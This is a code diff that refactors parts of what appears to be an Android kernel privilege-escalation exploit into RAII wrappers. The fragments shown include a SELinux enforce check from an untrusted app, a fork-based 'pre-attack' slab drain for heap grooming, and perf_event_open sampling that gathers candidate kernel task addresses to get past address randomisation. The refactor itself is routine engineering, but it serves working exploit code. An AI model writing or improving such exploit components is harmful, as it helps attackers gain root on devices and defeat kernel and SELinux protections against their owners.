@@ -9,6 +9,7 @@
 #include "routes/route_controller.h"
 #include "profile.h"
 #include "support/native_resource.hpp"
+#include <array>
 #include <ctype.h>
 #include <sys/ioctl.h>
 #include <sys/mman.h>
@@ -639,22 +640,19 @@ static int do_one_write(const WriteRequest *request, const char *desc) {
 }
 
 static int check_selinux_off(void) {
-    int efd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
-    if (efd < 0) {
+    ghostlock::UniqueFd efd(open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC));
+    if (!efd.valid()) {
         /* untrusted_app often cannot read enforce while SELinux is enforcing. */
         return 0;
     }
     char b[4] = {0};
-    read(efd, b, sizeof(b));
-    close(efd);
+    read(efd.get(), b, sizeof(b));
     return b[0] == '0';
 }
 
 static int enforce_readable(void) {
-    int efd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
-    if (efd < 0) return 0;
-    close(efd);
-    return 1;
+    ghostlock::UniqueFd efd(open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC));
+    return efd.valid() ? 1 : 0;
 }
 
 static int process_has_seccomp(void) {
@@ -686,8 +684,9 @@ static void slab_drain(void) {
     int waves = (up.tv_sec > 60) ? 2 : 1;
     int batch = (up.tv_sec > 60) ? 64 : 32;
     for (int wave = 0; wave < waves; wave++) {
-        auto *drain = static_cast<pid_t *>(calloc((size_t) batch, sizeof(pid_t)));
-        if (!drain) return;
+        /* Fixed upper bound (batch <= 64): no heap and no vector exception
+         * paths in this pre-attack drain. */
+        std::array<ghostlock::ChildProcess, 64> drain;
         int n = 0;
         for (int i = 0; i < batch; i++) {
             pid_t pid = fork();
@@ -695,14 +694,15 @@ static void slab_drain(void) {
                 pause();
                 _exit(0);
             }
-            if (pid > 0) drain[n++] = pid;
-            else break;
+            if (pid > 0) {
+                if (n >= (int) drain.size()) break;
+                drain[n++] = ghostlock::ChildProcess(pid);
+            } else {
+                break;
+            }
         }
-        for (int i = 0; i < n; i++) {
-            kill(drain[i], SIGKILL);
-            waitpid(drain[i], NULL, 0);
-        }
-        free(drain);
+        /* kill + reap in the original order, now owned by ChildProcess */
+        for (int i = 0; i < n; i++) (void) drain[i].terminate_and_wait(SIGKILL);
         sched_yield();
         usleep(20000);
     }
@@ -916,25 +916,27 @@ static uintptr_t perf_find_task(void) {
     pe.exclude_idle = 1;
 
     errno = 0;
-    int fd = (int) syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
-    if (fd < 0) {
+    ghostlock::UniqueFd fd((int) syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0));
+    if (!fd.valid()) {
         pr_warning("perf_event_open failed errno=%d\n", errno);
         return 0;
     }
     size_t msz = 4096 * (1 + 32);
-    void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
-    if (buf == MAP_FAILED) {
+    void *mapped = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd.get(), 0);
+    if (mapped == MAP_FAILED) {
         pr_warning("perf mmap failed errno=%d\n", errno);
-        close(fd);
         return 0;
     }
-    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
+    /* Declaration order keeps the original release order: munmap (buf) runs
+     * before close (fd) when this scope exits. */
+    ghostlock::MappedRegion buf(mapped, msz);
+    ioctl(fd.get(), PERF_EVENT_IOC_ENABLE, 0);
     for (int i = 0; i < 500000; i++) syscall(__NR_getpid);
-    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
-    auto *hdr = static_cast<struct perf_event_mmap_page *>(buf);
+    ioctl(fd.get(), PERF_EVENT_IOC_DISABLE, 0);
+    auto *hdr = static_cast<struct perf_event_mmap_page *>(buf.data());
     uint64_t head = hdr->data_head;
     __sync_synchronize();
-    char *base = (char *) buf + 4096;
+    char *base = (char *) buf.data() + 4096;
     size_t dsz = 4096 * 32;
     uint64_t pos = hdr->data_tail;
     uintptr_t cands[256];
@@ -962,8 +964,6 @@ static uintptr_t perf_find_task(void) {
         pos += ev->size;
     }
     hdr->data_tail = head;
-    munmap(buf, msz);
-    close(fd);
     if (!nc) return 0;
     uintptr_t best = 0;
     int best_cnt = 0;
